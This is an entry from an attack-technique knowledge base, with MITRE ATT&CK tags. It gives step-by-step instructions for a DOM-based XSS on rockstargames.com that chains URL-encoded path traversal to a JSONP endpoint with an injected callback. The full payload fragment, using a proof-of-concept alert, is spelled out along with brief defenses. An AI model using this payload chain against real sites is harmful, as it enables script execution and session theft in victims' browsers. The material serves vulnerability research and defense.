---
id: proc-uuid-004
tags:
  - xss
  - payload
  - path-traversal
  - jsonp
  - web
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
  - '[[File and Directory Discovery]]'
updated_at: '2025-12-13T23:52:24.303Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[File and Directory Discovery]]'
---
# Craft-Path-Traversal-Payload-for-XSS

## Summary

This procedure constructs a malicious URL fragment using path traversal to target a JSONP endpoint and inject an arbitrary callback function, resulting in JavaScript execution for DOM-based XSS on rockstargames.com.

## Description

The payload combines directory traversal (%2e%2e%5c) to reach /comments_dal/users/getGlobalLoginSettings.json, appends ?callback=alert(/xss/), and comments out trailing code. When loaded via the tags page, the XHR fetches the endpoint, returns application/javascript with the injected alert, and executes it in the victim's browser context.

## Requirements

1. Confirmed JSONP endpoint from prior discovery
2. URL encoding knowledge for special characters
3. Target page access

## Defense

Defensive measures and detection strategies:

- Normalize paths to prevent traversal (e.g., canonicalize URLs)
- Reject or escape callback parameters with non-alphanumeric chars
- Disable JSONP or restrict to trusted domains

## Objectives

1. Achieve arbitrary JS execution via reflected payload
2. Demonstrate full XSS impact in browser session
3. Validate chain from traversal to code execution

## Instructions

### Step 1: Encode the Traversal Path

**Context**: Build the base traversal to the target endpoint.

Use %2e%2e%2e%2e%2e%2e%5c for multiple '../' and append comments_dal%5cusers%5cgetGlobalLoginSettings%2ejson.

> Decoded: ../../../comments_dal/users/getGlobalLoginSettings.json

### Step 2: Inject Malicious Callback and Load

**Context**: Add the callback and execute the payload.

Full fragment: #/?tags=%2e%2e%2e%2e%2e%2e%5ccomments_dal%5cusers%5cgetGlobalLoginSettings%2ejson?callback=alert(%2fxss%2f);%2f%2f. Navigate to the URL.

> XHR response: alert(/xss/)({json data}); // executes alert immediately.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]
- [[File and Directory Discovery]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- xss
- payload
- path-traversal
- jsonp
- web
